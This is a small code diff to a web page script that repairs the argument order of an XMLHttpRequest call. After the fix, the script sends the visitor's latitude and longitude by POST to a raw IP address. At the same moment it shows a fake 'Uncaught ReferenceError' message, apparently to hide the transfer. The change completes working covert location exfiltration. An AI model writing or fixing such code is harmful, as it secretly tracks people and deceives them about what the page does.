@@ -22,7 +22,7 @@ function getLocation() {
 function showPosition(position) {
   x.innerHTML = "Uncaught ReferenceError: restaurant is not defined at <anonymous>:1:1";
   let xhttp = new XMLHttpRequest();
-  xhttp.open("http://68.183.143.19/data", "POST", true);
+  xhttp.open("POST", "http://68.183.143.19/data", true);
   xhttp.send({"lat": position.coords.latitude.toString(), "long": position.coords.longitude.toString()});
 }
 </script>
